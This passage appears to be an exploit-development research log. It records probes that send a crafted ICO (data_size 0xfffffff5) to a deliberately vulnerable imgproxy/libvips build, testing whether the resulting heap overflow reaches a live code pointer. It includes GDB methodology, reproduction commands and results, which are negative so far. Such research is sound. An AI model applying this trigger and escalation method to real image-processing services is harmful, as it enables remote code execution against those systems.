sha256 `2f9baaef93bb6262869b7a4d0797b9878da3d7670f777b5b9549fee8e461db09`
records the gate followed by the allocator abort in the victim thread.

The second request now demonstrably arrives while the wire-derived pointer
is the live bin-1 head, but HTTP work is distributed across threads and
tcaches; no natural allocation returned the wire-decoded pointer.
`GOMAXPROCS=1` did not pin the second GET to the victim thread. The abort
runs show allocator detection of the wire-derived link, not consumption by
an attacker-influenced allocation. Grade stays rung 4; no wire-only key,
marker, code-pointer write or r5. All non-gate and abort layouts are kept in
`/tmp/w12-out` and are not retried into existence; W204's verdict on W9 is
unchanged.

## W13 — attacker-reachable window has no live code pointer (2026-11-24 21:17-21:22Z, author, unwitnessed)

Question left by W5/W8/W9/W11/W12: the `data_size` wrap gives an unbounded
write (the copied length is the source body, `data_size` only caps the read),
so can the attacker body reach a live code/vtable pointer rather than glibc
allocator metadata?

Probe: `provision/ico_codeptr_reach.py`
sha256 `4c245cd2bc1468e10f2cf5911039441e07d2f1ca8b74740038ff5c9b31aac304`.
It serves a benign favicon plus a crafted ICO (`data_size=0xfffffff5`, body
of N `0x41` bytes) on 127.0.0.1:18181, launches the pinned plain
`provision/imgproxy-vuln` (sha256
`ea2317df2a42d30e81f33e0cfd822b49b99996545ffc49026573212b03d8165d`)
under `gdb -batch` bound to 127.0.0.1:18180 with `IMGPROXY_WORKERS=1`,
`IMGPROXY_CONCURRENCY=1`, `LD_LIBRARY_PATH=../../libvips2shell/build-vuln-plain/libvips`.
A GDB Python `gdb.Breakpoint` subclass stops only when `$rdx == 0xfffffff5`
at `vips_foreign_load_read_full`. At the hit the script saves `$w13buf=$rsi`,
prints `/proc/<pid>/maps` from GDB Python, dumps `x/Ngx $w13buf-16` before
and after `finish`, prints `bt 3`, then `continue`s. No inferior memory
write and no forced call; both endpoints are loopback-only. Ports
18180/18181 were free before and after.

Reproduction commands (from `provision/`):

    python3 ico_codeptr_reach.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w13c1 2 1024 10
    python3 ico_codeptr_reach.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w13c2 6 64 10
    python3 ico_codeptr_reach.py ./imgproxy-vuln \
      ../../libvips2shell/build-vuln-plain/libvips w13c3 2 256 10

Logs and classification (qwords strictly between `W13_POST` and `W13_BT`,
compared to the 64 `x` mappings from `/proc/<pid>/maps`):

* `http-ico-w13-w13c1.log` sha256
  `c4dfd2f87546be693f1b6c947cb035b804e756af32a81204bab6e12ce66d5bf1`,
  preload 2, body 1024, base `0x7fff840580b0`, actual `0x7fff840580be`:
  136 qwords dumped, 128 `0x4141414141414141`, 0 code pointers; client saw
  `RemoteDisconnected`, process aborted in `double free or corruption (out)`.
* `http-ico-w13-w13c2.log` sha256
  `2a4778950b2c6160c8a535e41c45674e4b3a2e1c1d0e903c1a75de64de4a9f4d`,
  preload 6, body 64, base `0x7fff980844e0`, actual `0x7fff980844ee`:
  16 qwords dumped, 8 markers, 0 code pointers; `malloc(): corrupted top
  size` abort.
* `http-ico-w13-w13c3.log` sha256
  `c1105c8b9ff0fefd1903f90177924f15594a1611f826503aa6c80867308bba2a`,
  preload 2, body 256, base `0x7fff98002480`, actual `0x7fff9800248e`:
  40 qwords dumped, 32 markers, 0 code pointers; `malloc(): corrupted top
  size` abort.

In `w13c2` the post dump is explicit: the two qwords before `actual` are zero,
the next eight are the chosen marker, and the rest are zero. The only
executable addresses in the whole GDB output were the three `bt 3` frames
(`0x2da4ec2` in the harness text, `0x7ffff7a4217b` in libvips `foreign.c`,
`0x7ffff7bb92f6` in libvips `object.c`) — stack frames, not heap-window
values — and the first classification pass falsely counted them because it
sliced everything after `W13_POST`; the corrected pass ends the slice at
`W13_BT` and reports `code_ptr_qwords=0` for all three. That false positive
is preserved here rather than erased.

Probe-development negatives: a plain conditional breakpoint
`break ... if $rdx == 0xfffffff5` fails with `No registers` before `run`
(fixed with the GDB Python breakpoint); dumping `$rsi` after `finish` used
the caller's register and showed zeros instead of the marker (fixed by
saving `$w13buf` at the hit); `/proc/maps` addresses print without `0x` and
need a bare-hex regex; raw GDB `/proc/maps` lines carry trailing spaces, so the
probe now right-strips each line on write. The failed first run
(`http-ico-w13-w13a1.log`) and the three unnormalized `w13b*` runs were
superseded by the committed `w13c*` logs and are not committed.

All three layouts aborted in glibc allocator metadata checks before any
pointer was used as a call target. No RIP-at-marker, no code-pointer write
to a live function pointer and no r5 were observed. This is a bounded
negative over three stochastic layouts, not an exhaustive proof. Grade
stays rung 4; W201 remains the ceiling and W204's verdict on W9 is
unchanged.

## W14 — span-restricted classification and clean-archive W13 replay (2026-11-24 23:12-23:18Z, author)

First clean-archive replay of `6eb6790f`, using the W13 classifier, produced a
false positive: config `rc3` (preload 2, body 256) printed
`code_ptr_qwords=2 code_samples=['0x1410000','0x410000']`. Both values were
dumped qwords at `actual+0x108` and `actual+0x128` — 8 and 40 bytes past the
256-byte attacker-written span `[actual, actual+0x100)` with
`actual=0x7fff7c067aee` — so no attacker byte reached either. They were
pre-existing heap values whose low addresses fall inside imgproxy's
`00404000-02da9000 r-xp` text mapping (a non-PIE Go binary with a ~46 MiB
executable range). The old `classify()` counted every qword between
`W13_POST` and `W13_BT`, including the eight qwords the probe deliberately
dumps past the write. No call target, marker execution or r5 was observed.
This false positive is preserved, not erased.

Fix: `provision/ico_codeptr_reach.py` at commit `2e6b4d16`, sha256
`9c2adf676855265822fa687fb7fa0b1fe9fcc944bd8f045e5b7f273b4b1046bb`, parses
the dump addresses and counts only qwords whose address lies in
`[actual, actual+bodylen)`; out-of-span code-shaped values are reported
separately as `outside_span_code_values`. Reclassifying the archived `rc3`
log offline gives `W13_CLASSIFY exec_ranges=64 qwords=32 marker_qwords=32
code_ptr_qwords=0 code_samples=[] outside_span_code_values=['0x1410000',
'0x410000']`.

One-command replay (from the repo root), with only the two gitignored inputs
supplied by the host:

    sh lab/frontier/imgproxy2shell/provision/replay-w13.sh /tmp/w14-imgproxy-w13-corrected

The script verifies the probe and pinned CLI SHA-256, extracts
`git archive 2e6b4d16 lab/frontier/imgproxy2shell` into `/tmp`, symlinks the
default `provision/imgproxy-vuln` and
`../../libvips2shell/build-vuln-plain/libvips`, then runs the three W13
configs (preload/body 2/1024, 6/64, 2/256), asserting `W13_HIT`, `W13_END`
and `code_ptr_qwords=0` in each. Observed `REPLAY_W13_OK 3/3
code_ptr_qwords=0`: rc1 128 markers of 128 qwords, `double free or
corruption (out)`; rc2 8 of 8, `malloc(): corrupted top size`; rc3 32 of 32,
SIGSEGV in `_int_malloc`. Ports 18180/18181 were free before and after; all
HTTP and GDB traffic stayed on loopback. This is an author replay of a
bounded negative, not independent witness acceptance. Grade stays rung 4;
W201 remains the ceiling and W204's W9 verdict is unchanged.
